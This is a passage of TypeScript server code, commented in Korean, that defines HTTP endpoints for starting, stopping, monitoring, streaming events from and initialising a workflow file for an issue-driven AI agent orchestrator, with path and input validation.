          res.end(JSON.stringify({ error: `WORKFLOW.md 없음: ${workflowPath}` }))
          return
        }
        const orch = startHarness(projectPath, workflowPath, claudePath)
        res.writeHead(200, { 'Content-Type': 'application/json', ...CORS })
        res.end(JSON.stringify({
          status:        'started',
          projectSlug:   orch.config.tracker.project_slug,
          intervalMs:    orch.config.polling.interval_ms,
          maxConcurrent: orch.config.agent.max_concurrent_agents,
          workspaceRoot: orch.config.workspace.root,
          activeStates:  orch.config.tracker.active_states,
        }))
      } catch (e: unknown) {
        res.writeHead(500, CORS); res.end(JSON.stringify({ error: (e as Error).message }))
      }
    })
    return true
  }

  // ── DELETE /api/harness/stop?projectPath=... ────────────────────
  if (pathname === '/api/harness/stop' && req.method === 'DELETE') {
    const qp = new URL(req.url!, 'http://localhost').searchParams
    stopHarness(validateProjectPathParam(qp.get('projectPath') ?? '') ?? '')
    res.writeHead(200, { 'Content-Type': 'application/json', ...CORS })
    res.end(JSON.stringify({ status: 'stopped' }))
    return true
  }

  // ── GET /api/harness/status?projectPath=... ─────────────────────
  if (pathname === '/api/harness/status' && req.method === 'GET') {
    const qp = new URL(req.url!, 'http://localhost').searchParams
    const orch = orchestrators.get(validateProjectPathParam(qp.get('projectPath') ?? '') ?? '')
    if (!orch) {
      res.writeHead(200, { 'Content-Type': 'application/json', ...CORS })
      res.end(JSON.stringify({ status: 'stopped' }))
      return true
    }
    const running  = Array.from(orch.workers.values()).filter(w => w.status === 'running')
    const retrying = Array.from(orch.workers.values()).filter(w => w.status === 'retrying')
    res.writeHead(200, { 'Content-Type': 'application/json', ...CORS })
    res.end(JSON.stringify({
      status:      orch.status,
      projectSlug: orch.config.tracker.project_slug,
      lastCheck:   orch.lastCheck,
      running:  running.map(w  => ({ issueNumber: w.issue.id, issueTitle: w.issue.title, attempt: w.attempt })),
      retrying: retrying.map(w => ({ issueNumber: w.issue.id, retryAt: new Date(w.nextRetryMs).toISOString() })),
      tokenTotals: orch.tokenTotals,
    }))
    return true
  }

  // ── POST /api/harness/refresh?projectPath=... ───────────────────
  if (pathname === '/api/harness/refresh' && req.method === 'POST') {
    const qp = new URL(req.url!, 'http://localhost').searchParams
    const orch = orchestrators.get(validateProjectPathParam(qp.get('projectPath') ?? '') ?? '')
    if (orch) pollOnce(orch, claudePath).catch(console.error)
    res.writeHead(200, { 'Content-Type': 'application/json', ...CORS })
    res.end(JSON.stringify({ ok: true }))
    return true
  }

  // ── GET /api/harness/events?projectPath=... ─────────────────────
  // SSE: 오케스트레이터 전체 이벤트 스트림
  if (pathname === '/api/harness/events' && req.method === 'GET') {
    const qp    = new URL(req.url!, 'http://localhost').searchParams
    const orch  = orchestrators.get(validateProjectPathParam(qp.get('projectPath') ?? '') ?? '')
    res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', Connection: 'keep-alive', ...CORS })
    if (!orch) {
      res.write(`data: ${JSON.stringify({ type: 'error', message: '실행 중인 하네스 없음' })}\n\n`)
      res.end(); return true
    }
    // SSE 클라이언트 상한 200 — 단일 오케스트레이터에 연결 폭주 방지
    if (orch.sseClients.size >= 200) {
      res.writeHead(429, { 'Content-Type': 'application/json', ...CORS })
      res.end(JSON.stringify({ error: 'Too many SSE clients' })); return true
    }
    orch.sseClients.add(res)
    req.on('close', () => orch.sseClients.delete(res))
    return true
  }

  // ── GET /api/harness/worker-events?projectPath=&issueNumber= ────
  // SSE: 특정 이슈 워커 이벤트 스트림 (기존 이벤트 리플레이 포함)
  if (pathname === '/api/harness/worker-events' && req.method === 'GET') {
    const qp    = new URL(req.url!, 'http://localhost').searchParams
    const orch  = orchestrators.get(validateProjectPathParam(qp.get('projectPath') ?? '') ?? '')
    const num   = parseInt(qp.get('issueNumber') ?? '0')
    res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', Connection: 'keep-alive', ...CORS })
    const worker = orch?.workers.get(num)
    if (!worker) {
      res.write(`data: ${JSON.stringify({ type: 'error', message: '워커 없음' })}\n\n`)
      res.end(); return true
    }
    // 기존 이벤트 리플레이
    for (const msg of worker.events) {
      res.write(`data: ${JSON.stringify({ type: 'event', message: msg })}\n\n`)
    }
    // SSE 클라이언트 상한 100 — 단일 워커에 연결 폭주 방지
    if (worker.sseClients.size >= 100) {
      res.writeHead(429, { 'Content-Type': 'application/json', ...CORS })
      res.end(JSON.stringify({ error: 'Too many SSE clients for this worker' })); return true
    }
    worker.sseClients.add(res)
    req.on('close', () => worker.sseClients.delete(res))
    return true
  }

  // ── GET /api/harness/check?projectPath=... ─────────────────────
  // WORKFLOW.md 존재 여부 + JiKiME-ADK 감지 + git remote slug 자동 감지
  if (pathname === '/api/harness/check' && req.method === 'GET') {
    const qp          = new URL(req.url!, 'http://localhost').searchParams
    const rawCheckPath = qp.get('projectPath') ?? ''
    // projectPath 정규화 + 경로 순회 방지 — detectGitSlug(cwd) 호출 전 필수
    const projectPath  = validateProjectPathParam(rawCheckPath) ?? rawCheckPath
    const workflowPath = path.join(projectPath, 'WORKFLOW.md')
    const exists    = projectPath ? fs.existsSync(workflowPath) : false
    const isRunning = orchestrators.has(projectPath)
    const isJikiMe  = projectPath ? detectJikiMe(projectPath) : false
    const slug      = (!exists && projectPath) ? detectGitSlug(projectPath) : ''
    res.writeHead(200, { 'Content-Type': 'application/json', ...CORS })
    res.end(JSON.stringify({ exists, isRunning, isJikiMe, slug }))
    return true
  }

  // ── POST /api/harness/init ──────────────────────────────────────
  // WORKFLOW.md 생성 (Basic 또는 JiKiME-ADK 템플릿)
  if (pathname === '/api/harness/init' && req.method === 'POST') {
    req.setTimeout(30_000, () => { req.destroy() })
    const MAX_INIT_BODY = 100 * 1024  // 100 KB
    let body = ''
    let bodySize = 0
    req.on('data', (c: Buffer) => {
      bodySize += c.length
      if (bodySize > MAX_INIT_BODY) { req.destroy(); return }
      body += c
    })
    req.on('end', () => {
      if (bodySize > MAX_INIT_BODY) {
        res.writeHead(413, CORS); res.end(JSON.stringify({ error: 'Request body too large' })); return
      }
      try {
        const {
          projectPath, slug, label, workspaceRoot, port, maxAgents, mode,
        } = JSON.parse(body) as {
          projectPath:   string
          slug:          string
          label?:        string
          workspaceRoot?: string
          port?:         number
          maxAgents?:    number
          mode?:         'basic' | 'jikime'
        }

        if (!projectPath || !slug) {
          res.writeHead(400, CORS)
          res.end(JSON.stringify({ error: 'projectPath 와 slug 가 필요합니다.' }))
          return
        }
        // slug owner/repo 형식 검증 — WORKFLOW.md 템플릿 내 문자열 삽입 전 필수
        if (!SLUG_RE.test(slug)) {
          res.writeHead(400, CORS)
          res.end(JSON.stringify({ error: 'slug는 owner/repo 형식이어야 합니다.' }))
          return
        }

        const workflowPath = path.join(projectPath, 'WORKFLOW.md')
        const params: WorkflowParams = {
          slug,
          label:         label         ?? 'jikime-todo',
          workspaceRoot: workspaceRoot ?? `~/jikime_workspaces`,
          port:          port          ?? 0,
          maxAgents:     maxAgents     ?? 3,
        }

        const content = mode === 'jikime'
          ? workflowTemplateJikiMe(params)
          : workflowTemplateBasic(params)

        fs.writeFileSync(workflowPath, content, 'utf8')
        console.log(`[harness] WORKFLOW.md 생성: ${workflowPath} (모드: ${mode ?? 'basic'})`)

        res.writeHead(200, { 'Content-Type': 'application/json', ...CORS })
        res.end(JSON.stringify({ success: true, path: workflowPath, mode: mode ?? 'basic' }))
      } catch (e: unknown) {
        res.writeHead(500, CORS)
        res.end(JSON.stringify({ error: (e as Error).message }))
      }
    })
    return true
  }

  return false
}
